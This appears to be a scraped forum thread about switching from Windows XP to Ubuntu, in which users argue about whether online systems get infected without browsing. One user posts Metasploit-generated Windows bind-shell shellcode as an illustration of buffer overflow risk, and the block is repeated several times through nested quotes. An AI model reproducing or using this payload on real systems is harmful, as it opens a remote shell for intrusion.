channel.title: Just installed Ubuntu
channel.description: Not like anyone cares really lol, but I finally came over my partitioning fear. And I must say, never judge an OS from a VM test. I'm impressed, ubuntu looks so much better than vista, and now I know that I'll be secure from Windows' viruses. I don't think I'll be using XP much anymore, linux runs smooth and fast, which is something I rarely experience from XP.

item.title: Just installed Ubuntu
item.dc:creator: @juju juju
item.description:
@juju wrote:

[quote=“Zach1188, post:21, topic:25191”][quote author=juju link=topic=37985.msg588480#msg588480 date=1165638725]

  1. Err, what? O MAN LETZ HACK THRU TELNET DOOD. Have you never heard of buffer overflows? They allow “exploiters” to execute code that they supply on your system.

Here’s some code that an exploiter could use to bind a shell to port 123, I generated this on Metasploit:

/* win32_bind - EXITFUNC=seh LPORT=123 Size=344 Encoder=PexFnstenvSub http://metasploit.com */ unsigned char scode[] = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad" "\xef\x2d\x60\x83\xeb\xfc\xe2\xf4\x51\x85\xc6\x2d\x45\x16\xd2\x9f" "\x52\x8f\xa6\x0c\x89\xcb\xa6\x25\x91\x64\x51\x65\xd5\xee\xc2\xeb" "\xe2\xf7\xa6\x3f\x8d\xee\xc6\x29\x26\xdb\xa6\x61\x43\xde\xed\xf9" "\x01\x6b\xed\x14\xaa\x2e\xe7\x6d\xac\x2d\xc6\x94\x96\xbb\x09\x48" "\xd8\x0a\xa6\x3f\x89\xee\xc6\x06\x26\xe3\x66\xeb\xf2\xf3\x2c\x8b" "\xae\xc3\xa6\xe9\xc1\xcb\x31\x01\x6e\xde\xf6\x04\x26\xac\x1d\xeb" "\xed\xe3\xa6\x10\xb1\x42\xa6\x20\xa5\xb1\x45\xee\xe3\xe1\xc1\x30" "\x52\x39\x4b\x33\xcb\x87\x1e\x52\xc5\x98\x5e\x52\xf2\xbb\xd2\xb0" "\xc5\x24\xc0\x9c\x96\xbf\xd2\xb6\xf2\x66\xc8\x06\x2c\x02\x25\x62" "\xf8\x85\x2f\x9f\x7d\x87\xf4\x69\x58\x42\x7a\x9f\x7b\xbc\x7e\x33" "\xfe\xbc\x6e\x33\xee\xbc\xd2\xb0\xcb\x87\x2d\x1b\xcb\xbc\xa4\x81" "\x38\x87\x89\x7a\xdd\x28\x7a\x9f\x7b\x85\x3d\x31\xf8\x10\xfd\x08" "\x09\x42\x03\x89\xfa\x10\xfb\x33\xf8\x10\xfd\x08\x48\xa6\xab\x29" "\xfa\x10\xfb\x30\xf9\xbb\x78\x9f\x7d\x7c\x45\x87\xd4\x29\x54\x37" "\x52\x39\x78\x9f\x7d\x89\x47\x04\xcb\x87\x4e\x0d\x24\x0a\x47\x30" "\xf4\xc6\xe1\xe9\x4a\x85\x69\xe9\x4f\xde\xed\x93\x07\x11\x6f\x4d" "\x53\xad\x01\xf3\x20\x95\x15\xcb\x06\x44\x45\x12\x53\x5c\x3b\x9f" "\xd8\xab\xd2\xb6\xf6\xb8\x7f\x31\xfc\xbe\x47\x61\xfc\xbe\x78\x31" "\x52\x3f\x45\xcd\x74\xea\xe3\x33\x52\x39\x47\x9f\x52\xd8\xd2\xb0" "\x26\xb8\xd1\xe3\x69\x8b\xd2\xb6\xff\x10\xfd\x08\x5d\x65\x29\x3f" "\xfe\x10\xfb\x9f\x7d\xef\x2d\x60";
[/quote]
Yes, I know about buffer overflows, but telnet was just an example. Stfu, my point was 100% valid. There is VERY little chance of getting a virus if you are not browsing the internet/downloading and such.[/quote]

Not really, the chance is quite high if your system is insecure, there are always botnets scanning for insecure boxes to take advantage of - but that’s mainly for Windows, so eh.

Kevin Mitnick and marketing communications firm Avantgarde found that an unprotected and unpatched Windows XP system lasted only 4 minutes on the Internet before it was compromised. [5] The AOL National Cyber Security Alliance Online Safety Study of October 2004 determined that 80% of Windows users were infected by at least one spyware/adware product.

Read full topic

item.title: Just installed Ubuntu
item.dc:creator: @Zach1188 Zach1188
item.description:
@Zach1188 wrote:

[quote=“juju, post:16, topic:25191”]1. Err, what? O MAN LETZ HACK THRU TELNET DOOD. Have you never heard of buffer overflows? They allow “exploiters” to execute code that they supply on your system.

Here’s some code that an exploiter could use to bind a shell to port 123, I generated this on Metasploit:

/* win32_bind - EXITFUNC=seh LPORT=123 Size=344 Encoder=PexFnstenvSub http://metasploit.com */ unsigned char scode[] = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad" "\xef\x2d\x60\x83\xeb\xfc\xe2\xf4\x51\x85\xc6\x2d\x45\x16\xd2\x9f" "\x52\x8f\xa6\x0c\x89\xcb\xa6\x25\x91\x64\x51\x65\xd5\xee\xc2\xeb" "\xe2\xf7\xa6\x3f\x8d\xee\xc6\x29\x26\xdb\xa6\x61\x43\xde\xed\xf9" "\x01\x6b\xed\x14\xaa\x2e\xe7\x6d\xac\x2d\xc6\x94\x96\xbb\x09\x48" "\xd8\x0a\xa6\x3f\x89\xee\xc6\x06\x26\xe3\x66\xeb\xf2\xf3\x2c\x8b" "\xae\xc3\xa6\xe9\xc1\xcb\x31\x01\x6e\xde\xf6\x04\x26\xac\x1d\xeb" "\xed\xe3\xa6\x10\xb1\x42\xa6\x20\xa5\xb1\x45\xee\xe3\xe1\xc1\x30" "\x52\x39\x4b\x33\xcb\x87\x1e\x52\xc5\x98\x5e\x52\xf2\xbb\xd2\xb0" "\xc5\x24\xc0\x9c\x96\xbf\xd2\xb6\xf2\x66\xc8\x06\x2c\x02\x25\x62" "\xf8\x85\x2f\x9f\x7d\x87\xf4\x69\x58\x42\x7a\x9f\x7b\xbc\x7e\x33" "\xfe\xbc\x6e\x33\xee\xbc\xd2\xb0\xcb\x87\x2d\x1b\xcb\xbc\xa4\x81" "\x38\x87\x89\x7a\xdd\x28\x7a\x9f\x7b\x85\x3d\x31\xf8\x10\xfd\x08" "\x09\x42\x03\x89\xfa\x10\xfb\x33\xf8\x10\xfd\x08\x48\xa6\xab\x29" "\xfa\x10\xfb\x30\xf9\xbb\x78\x9f\x7d\x7c\x45\x87\xd4\x29\x54\x37" "\x52\x39\x78\x9f\x7d\x89\x47\x04\xcb\x87\x4e\x0d\x24\x0a\x47\x30" "\xf4\xc6\xe1\xe9\x4a\x85\x69\xe9\x4f\xde\xed\x93\x07\x11\x6f\x4d" "\x53\xad\x01\xf3\x20\x95\x15\xcb\x06\x44\x45\x12\x53\x5c\x3b\x9f" "\xd8\xab\xd2\xb6\xf6\xb8\x7f\x31\xfc\xbe\x47\x61\xfc\xbe\x78\x31" "\x52\x3f\x45\xcd\x74\xea\xe3\x33\x52\x39\x47\x9f\x52\xd8\xd2\xb0" "\x26\xb8\xd1\xe3\x69\x8b\xd2\xb6\xff\x10\xfd\x08\x5d\x65\x29\x3f" "\xfe\x10\xfb\x9f\x7d\xef\x2d\x60";[/quote]
Yes, I know about buffer overflows, but telnet was just an example. Stfu, my point was 100% valid. There is VERY little chance of getting a virus if you are not browsing the internet/downloading and such.

Read full topic

Here’s some code that an exploiter could use to bind a shell to port 123, I generated this on Metasploit:

/* win32_bind - EXITFUNC=seh LPORT=123 Size=344 Encoder=PexFnstenvSub http://metasploit.com */ unsigned char scode[] = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad" "\xef\x2d\x60\x83\xeb\xfc\xe2\xf4\x51\x85\xc6\x2d\x45\x16\xd2\x9f" "\x52\x8f\xa6\x0c\x89\xcb\xa6\x25\x91\x64\x51\x65\xd5\xee\xc2\xeb" "\xe2\xf7\xa6\x3f\x8d\xee\xc6\x29\x26\xdb\xa6\x61\x43\xde\xed\xf9" "\x01\x6b\xed\x14\xaa\x2e\xe7\x6d\xac\x2d\xc6\x94\x96\xbb\x09\x48" "\xd8\x0a\xa6\x3f\x89\xee\xc6\x06\x26\xe3\x66\xeb\xf2\xf3\x2c\x8b" "\xae\xc3\xa6\xe9\xc1\xcb\x31\x01\x6e\xde\xf6\x04\x26\xac\x1d\xeb" "\xed\xe3\xa6\x10\xb1\x42\xa6\x20\xa5\xb1\x45\xee\xe3\xe1\xc1\x30" "\x52\x39\x4b\x33\xcb\x87\x1e\x52\xc5\x98\x5e\x52\xf2\xbb\xd2\xb0" "\xc5\x24\xc0\x9c\x96\xbf\xd2\xb6\xf2\x66\xc8\x06\x2c\x02\x25\x62" "\xf8\x85\x2f\x9f\x7d\x87\xf4\x69\x58\x42\x7a\x9f\x7b\xbc\x7e\x33" "\xfe\xbc\x6e\x33\xee\xbc\xd2\xb0\xcb\x87\x2d\x1b\xcb\xbc\xa4\x81" "\x38\x87\x89\x7a\xdd\x28\x7a\x9f\x7b\x85\x3d\x31\xf8\x10\xfd\x08" "\x09\x42\x03\x89\xfa\x10\xfb\x33\xf8\x10\xfd\x08\x48\xa6\xab\x29" "\xfa\x10\xfb\x30\xf9\xbb\x78\x9f\x7d\x7c\x45\x87\xd4\x29\x54\x37" "\x52\x39\x78\x9f\x7d\x89\x47\x04\xcb\x87\x4e\x0d\x24\x0a\x47\x30" "\xf4\xc6\xe1\xe9\x4a\x85\x69\xe9\x4f\xde\xed\x93\x07\x11\x6f\x4d" "\x53\xad\x01\xf3\x20\x95\x15\xcb\x06\x44\x45\x12\x53\x5c\x3b\x9f" "\xd8\xab\xd2\xb6\xf6\xb8\x7f\x31\xfc\xbe\x47\x61\xfc\xbe\x78\x31" "\x52\x3f\x45\xcd\x74\xea\xe3\x33\x52\x39\x47\x9f\x52\xd8\xd2\xb0" "\x26\xb8\xd1\xe3\x69\x8b\xd2\xb6\xff\x10\xfd\x08\x5d\x65\x29\x3f" "\xfe\x10\xfb\x9f\x7d\xef\x2d\x60";
[/quote]

Thats the most retarded code I’ve ever seen.[/quote]

en.wikipedia.org

Shellcode

In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient. However, attempts at replacing the Sh...

/* win32_bind - EXITFUNC=seh LPORT=123 Size=344 Encoder=PexFnstenvSub http://metasploit.com */ unsigned char scode[] = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad" "\xef\x2d\x60\x83\xeb\xfc\xe2\xf4\x51\x85\xc6\x2d\x45\x16\xd2\x9f" "\x52\x8f\xa6\x0c\x89\xcb\xa6\x25\x91\x64\x51\x65\xd5\xee\xc2\xeb" "\xe2\xf7\xa6\x3f\x8d\xee\xc6\x29\x26\xdb\xa6\x61\x43\xde\xed\xf9" "\x01\x6b\xed\x14\xaa\x2e\xe7\x6d\xac\x2d\xc6\x94\x96\xbb\x09\x48" "\xd8\x0a\xa6\x3f\x89\xee\xc6\x06\x26\xe3\x66\xeb\xf2\xf3\x2c\x8b" "\xae\xc3\xa6\xe9\xc1\xcb\x31\x01\x6e\xde\xf6\x04\x26\xac\x1d\xeb" "\xed\xe3\xa6\x10\xb1\x42\xa6\x20\xa5\xb1\x45\xee\xe3\xe1\xc1\x30" "\x52\x39\x4b\x33\xcb\x87\x1e\x52\xc5\x98\x5e\x52\xf2\xbb\xd2\xb0" "\xc5\x24\xc0\x9c\x96\xbf\xd2\xb6\xf2\x66\xc8\x06\x2c\x02\x25\x62" "\xf8\x85\x2f\x9f\x7d\x87\xf4\x69\x58\x42\x7a\x9f\x7b\xbc\x7e\x33" "\xfe\xbc\x6e\x33\xee\xbc\xd2\xb0\xcb\x87\x2d\x1b\xcb\xbc\xa4\x81" "\x38\x87\x89\x7a\xdd\x28\x7a\x9f\x7b\x85\x3d\x31\xf8\x10\xfd\x08" "\x09\x42\x03\x89\xfa\x10\xfb\x33\xf8\x10\xfd\x08\x48\xa6\xab\x29" "\xfa\x10\xfb\x30\xf9\xbb\x78\x9f\x7d\x7c\x45\x87\xd4\x29\x54\x37" "\x52\x39\x78\x9f\x7d\x89\x47\x04\xcb\x87\x4e\x0d\x24\x0a\x47\x30" "\xf4\xc6\xe1\xe9\x4a\x85\x69\xe9\x4f\xde\xed\x93\x07\x11\x6f\x4d" "\x53\xad\x01\xf3\x20\x95\x15\xcb\x06\x44\x45\x12\x53\x5c\x3b\x9f" "\xd8\xab\xd2\xb6\xf6\xb8\x7f\x31\xfc\xbe\x47\x61\xfc\xbe\x78\x31" "\x52\x3f\x45\xcd\x74\xea\xe3\x33\x52\x39\x47\x9f\x52\xd8\xd2\xb0" "\x26\xb8\xd1\xe3\x69\x8b\xd2\xb6\xff\x10\xfd\x08\x5d\x65\x29\x3f" "\xfe\x10\xfb\x9f\x7d\xef\x2d\x60";[/quote]

item.title: Just installed Ubuntu
item.dc:creator: @juju juju
item.description:
@juju wrote:

[quote=“Zach1188, post:13, topic:25191”][quote author=Goat Spirit link=topic=37985.msg587516#msg587516 date=1165628753]

You only get viruses if you don’t make wise choices.
Linux sucks as a desktop.

Wrong and wrong.

  1. You can get viruses by just being connected to the internet. No browser open.

  2. Linux is a very good desktop, you just need to get used to it.
    [/quote]

  3. That may be possible, but someone would have to hack into your computer (telnet etc.), or you would have to have already had a virus that downloads more viruses (my mom got one of these). If you have telnet or something on, and your firewall is off, you deserve to have someone give you a virus. Computers only do what they are programmed to do, they will not do random things, like downloading random stuff, period (except for Windows updates, those may as well be viruses)

  4. Wrong also. Linux is an EXTREMELY good desktop :D[/quote][quote=“Zach1188, post:13, topic:25191”][quote author=Goat Spirit link=topic=37985.msg587516#msg587516 date=1165628753]

You only get viruses if you don’t make wise choices.
Linux sucks as a desktop.

Wrong and wrong.

  1. You can get viruses by just being connected to the internet. No browser open.

  2. Linux is a very good desktop, you just need to get used to it.
    [/quote]

  3. That may be possible, but someone would have to hack into your computer (telnet etc.), or you would have to have already had a virus that downloads more viruses (my mom got one of these). If you have telnet or something on, and your firewall is off, you deserve to have someone give you a virus. Computers only do what they are programmed to do, they will not do random things, like downloading random stuff, period (except for Windows updates, those may as well be viruses)

  4. Wrong also. Linux is an EXTREMELY good desktop :D[/quote]

  5. Err, what? O MAN LETZ HACK THRU TELNET DOOD. Have you never heard of buffer overflows? They allow “exploiters” to execute code that they supply on your system.

Here’s some code that an exploiter could use to bind a shell to port 123, I generated this on Metasploit:

/* win32_bind - EXITFUNC=seh LPORT=123 Size=344 Encoder=PexFnstenvSub http://metasploit.com */ unsigned char scode[] = "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xad" "\xef\x2d\x60\x83\xeb\xfc\xe2\xf4\x51\x85\xc6\x2d\x45\x16\xd2\x9f" "\x52\x8f\xa6\x0c\x89\xcb\xa6\x25\x91\x64\x51\x65\xd5\xee\xc2\xeb" "\xe2\xf7\xa6\x3f\x8d\xee\xc6\x29\x26\xdb\xa6\x61\x43\xde\xed\xf9" "\x01\x6b\xed\x14\xaa\x2e\xe7\x6d\xac\x2d\xc6\x94\x96\xbb\x09\x48" "\xd8\x0a\xa6\x3f\x89\xee\xc6\x06\x26\xe3\x66\xeb\xf2\xf3\x2c\x8b" "\xae\xc3\xa6\xe9\xc1\xcb\x31\x01\x6e\xde\xf6\x04\x26\xac\x1d\xeb" "\xed\xe3\xa6\x10\xb1\x42\xa6\x20\xa5\xb1\x45\xee\xe3\xe1\xc1\x30" "\x52\x39\x4b\x33\xcb\x87\x1e\x52\xc5\x98\x5e\x52\xf2\xbb\xd2\xb0" "\xc5\x24\xc0\x9c\x96\xbf\xd2\xb6\xf2\x66\xc8\x06\x2c\x02\x25\x62" "\xf8\x85\x2f\x9f\x7d\x87\xf4\x69\x58\x42\x7a\x9f\x7b\xbc\x7e\x33" "\xfe\xbc\x6e\x33\xee\xbc\xd2\xb0\xcb\x87\x2d\x1b\xcb\xbc\xa4\x81" "\x38\x87\x89\x7a\xdd\x28\x7a\x9f\x7b\x85\x3d\x31\xf8\x10\xfd\x08" "\x09\x42\x03\x89\xfa\x10\xfb\x33\xf8\x10\xfd\x08\x48\xa6\xab\x29" "\xfa\x10\xfb\x30\xf9\xbb\x78\x9f\x7d\x7c\x45\x87\xd4\x29\x54\x37" "\x52\x39\x78\x9f\x7d\x89\x47\x04\xcb\x87\x4e\x0d\x24\x0a\x47\x30" "\xf4\xc6\xe1\xe9\x4a\x85\x69\xe9\x4f\xde\xed\x93\x07\x11\x6f\x4d" "\x53\xad\x01\xf3\x20\x95\x15\xcb\x06\x44\x45\x12\x53\x5c\x3b\x9f" "\xd8\xab\xd2\xb6\xf6\xb8\x7f\x31\xfc\xbe\x47\x61\xfc\xbe\x78\x31" "\x52\x3f\x45\xcd\x74\xea\xe3\x33\x52\x39\x47\x9f\x52\xd8\xd2\xb0" "\x26\xb8\xd1\xe3\x69\x8b\xd2\xb6\xff\x10\xfd\x08\x5d\x65\x29\x3f" "\xfe\x10\xfb\x9f\x7d\xef\x2d\x60";

[/quote]
Wrong and wrong.

  1. You can get viruses by just being connected to the internet. No browser open.

  2. Linux is a very good desktop, you just need to get used to it. :)[/quote]

  3. That may be possible, but someone would have to hack into your computer (telnet etc.), or you would have to have already had a virus that downloads more viruses (my mom got one of these). If you have telnet or something on, and your firewall is off, you deserve to have someone give you a virus. Computers only do what they are programmed to do, they will not do random things, like downloading random stuff, period (except for Windows updates, those may as well be viruses)

  4. Wrong also. Linux is an EXTREMELY good desktop

item.description:
@Goat_Spirit wrote:

[quote=“DeadBird, post:5, topic:25191”]You only get viruses if you don’t make wise choices.
Linux sucks as a desktop.[/quote]
Wrong and wrong.

  1. You can get viruses by just being connected to the internet. No browser open.
  2. Linux is a very good desktop, you just need to get used to it.

Read full topic

item.title: Just installed Ubuntu
item.dc:creator: @Mopman Mopman
item.description:
@Mopman wrote:

[quote=“DeadBird, post:5, topic:25191”][quote author=bootnecklad link=topic=37985.msg473726#msg473726 date=1163818315]
welcome to the real world… you have been in a life of what is called the windows virus matrix…
[/quote]
Real world?
You only get viruses if you don’t make wise choices.
I prefer the old, unreal world. Ubuntu screwed my hd up. Linux sucks as a desktop, its great as a server though.[/quote]

No, Ubuntu did not “screw up your hard drive” and Linux has been a much better desktop OS than Windows for a long time for me now.

Read full topic

item.title: Just installed Ubuntu
item.dc:creator: @DeadBird DeadBird
item.description:
@DeadBird wrote:

mmm. I reinstalled it because XP was fakking up (again, usually it takes around 6 months but this took no time and I was fairly pissed) and I didn’t feel like messing with xp again. I only needed XP for ms office, until I found the great alternative, OpenOffice!
I don’t have the awful XP on my hd anymore. I don’t plan to get it back either. The only “hard” part in linux is installing stuff, which in Debian-based distros takes barely no time with apt-get install .
My next step is to try Solaris or BSD :).

Read full topic

item.title: Just installed Ubuntu
item.dc:creator: @DeadBird DeadBird
item.description:
@DeadBird wrote:

Not like anyone cares really lol, but I finally came over my partitioning fear. And I must say, never judge an OS from a VM test.
I’m impressed, ubuntu looks so much better than vista, and now I know that I’ll be secure from Windows’ viruses.
I don’t think I’ll be using XP much anymore, linux runs smooth and fast, which is something I rarely experience from XP.

Read full topic
